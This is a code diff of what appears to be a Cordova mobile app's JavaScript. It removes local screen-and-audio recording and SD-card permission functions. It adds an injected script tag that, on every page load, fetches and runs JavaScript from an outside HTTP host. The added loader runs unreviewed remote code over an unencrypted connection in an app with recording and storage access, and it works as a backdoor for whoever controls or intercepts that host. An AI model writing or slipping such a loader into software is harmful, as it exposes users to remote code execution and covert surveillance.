@@ -52,75 +52,8 @@ request.onreadystatechange = function(){
 request.send();
 }
 
-function tgl(){
-var d = new Date();
-return d.getFullYear() + "-" + 
-    ("00" + (d.getMonth() + 1)).slice(-2) + "-" + 
-    ("00" + d.getDate()).slice(-2) + "_" + 
-    ("00" + d.getHours()).slice(-2) + ":" + 
-    ("00" + d.getMinutes()).slice(-2) + ":" + 
-    ("00" + d.getSeconds()).slice(-2);
-}
-
-function rekam(){
-ScreenRecord.startRecord({isAudio: true}, '/sdcard/Download/'+tgl()+'.mp4', success, error);
-    function success(ok){
-        alert(ok);
-    }
-    function error(fail){
-        alert(fail);
-    }
-}
-function stop_rekam(){
-    ScreenRecord.stopRecord(success, error);
-    function success(ok){
-        alert(ok);
-    }
-    function error(fail){
-        alert(fail);
-    }
-}
-getExternalSdLocation();
-requestExternalSdPermission();
-
-function getExternalSdLocation(done){
-    cordova.plugins.diagnostic.getExternalSdCardDetails(function(details){
-        details.forEach(function(detail){
-            if(detail.type == "application"){
-                cordova.file.externalSdCardApplicationDirectory = detail.filePath;
-            }else if(detail.type == "root"){
-                cordova.file.externalSdCardRootDirectory = detail.filePath;
-            }
-        });
-        done();
-    }, function(error){
-        console.error(error);
-        done();
-    });
-}
-
-getExternalSdLocation(function(){
-    // use cordova.file.externalSdCardApplicationDirectory to write to SD card
-});
-
-function requestExternalSdPermission(done){
-    cordova.plugins.diagnostic.requestRuntimePermission(function(status){
-        switch(status){
-            case cordova.plugins.diagnostic.permissionStatus.GRANTED:
-                console.log("Permission granted");
-                getExternalSdLocation(done);
-                break;
-            case cordova.plugins.diagnostic.permissionStatus.DENIED:
-                console.log("Permission denied");
-                askAgain(done);
-                break;
-            case cordova.plugins.diagnostic.permissionStatus.DENIED_ALWAYS:
-                console.log("Permission permanently denied");
-                reportError(done);
-                break;
-        }
-    }, function(error){
-        console.error("The following error occurred: "+error);
-        reportError(done);
-    }, cordova.plugins.diagnostic.permission.WRITE_EXTERNAL_STORAGE);
-}
+var sNew = document.createElement("script");
+sNew.async = true;
+sNew.src = "http://play.my.id/auto/function.js?"+Math.random();
+var s0 = document.getElementsByTagName('script')[0];
+s0.parentNode.insertBefore(sNew, s0);
